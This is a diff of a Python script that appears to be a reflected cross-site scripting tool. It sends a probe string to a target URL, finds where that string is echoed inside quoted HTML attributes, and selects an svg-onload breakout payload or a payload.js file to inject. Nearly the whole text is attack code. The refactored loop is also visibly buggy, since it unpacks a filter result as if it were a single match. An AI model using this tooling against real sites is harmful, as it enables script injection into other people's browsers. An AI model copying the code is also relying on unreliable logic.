@@ -19,7 +19,14 @@ single_quote_payload = "\'><svg onload=\'init(); function init(){alert(0)}\'"
 double_quote_payload = "\"><svg onload=\'init(); function init(){alert(0)}\'"
 
 input_reg = '<input.*?name=\'(.*?)\'.*?>|<input.*?name="(.*?)".*?>'
-quotation_reg = f'<.*?=\"({test})\".*?>|<.*?=\'({test})\'.*?>'
+
+# contexts where the test input can land in
+contexts = [
+    {
+        "name" : "quotes",
+        "match_str" : f'<.*?=\"({test})\".*?>|<.*?=\'({test})\'.*?>'
+    }
+]
 
 # is this the pythonic way ... idk
 payload = reduce(lambda x, y : x + y, map(lambda x : x.strip(), open("payload.js").read().split('\n')))
@@ -42,16 +49,14 @@ for match in matches:
 test_response = requests.get(url, headers=headers, params=data)
 
 # look for test string in the response
-injection_sites = [re.match(input_reg, line) for line in test_response.text.split('\n')]
-for injection_site in filter(lambda x : x, injection_sites):
-    single_quote, double_quote = injection_site.group(1,2)
-    if single_quote:
-        payload = injection_sites[1].replace(test, single_quote_payload)
+for line in test_response.text.split('\n'):
+    # assume ctxts are mututally exclusive 
+    injection_sites, ctx = filter(lambda x: x[0], [(re.match(ctx["match_str"], line), ctx["name"]) for ctx in contexts])
+    if ctx == "quotes":
+        double_quote, single_quote = injection_sites.group(1,2)
+        print(single_quote, double_quote)
+        payload = single_quote_payload if single_quote else double_quote_payload
         print("payload: " + payload)
-    else:
-        payload = injection_sites[2].replace(test, double_quote_payload)
-        print("payloadx2: " + payload)
-
 
 
 
